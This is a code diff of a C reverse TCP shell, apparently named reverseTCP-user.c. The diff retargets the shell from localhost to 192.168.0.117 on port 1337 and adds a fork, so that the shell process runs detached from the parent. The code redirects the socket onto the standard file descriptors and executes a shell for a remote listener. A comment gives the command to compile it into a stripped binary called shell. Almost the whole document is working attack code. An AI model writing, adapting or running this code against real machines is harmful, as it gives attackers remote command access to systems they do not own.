@@ -6,7 +6,7 @@
 
 int main(void)
 {
-	int i;
+	int i, pid;
 	int sockfd;
 	socklen_t socklen;
 	struct sockaddr_in srv_addr;
@@ -14,7 +14,7 @@ int main(void)
     char *envp[] = {"HOME=/", "TERM=linux","PATH=/sbin:/usr/sbin:/bin:/usr/bin",NULL};
 	srv_addr.sin_family = AF_INET;
 	srv_addr.sin_port = htons(1337);
-	srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	srv_addr.sin_addr.s_addr = inet_addr("192.168.0.117");
 
 	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 
@@ -24,9 +24,12 @@ int main(void)
 	{
 		dup2(sockfd,i);
 	}
-
-	execve(argv[0],argv,envp);
-
+	pid = fork();
+	if(!pid)
+	{
+		execve(argv[0],argv,envp);
+	}
+	else
 	return 0;
 }
 //compile with: gcc -s -O3 reverseTCP-user.c -o shell
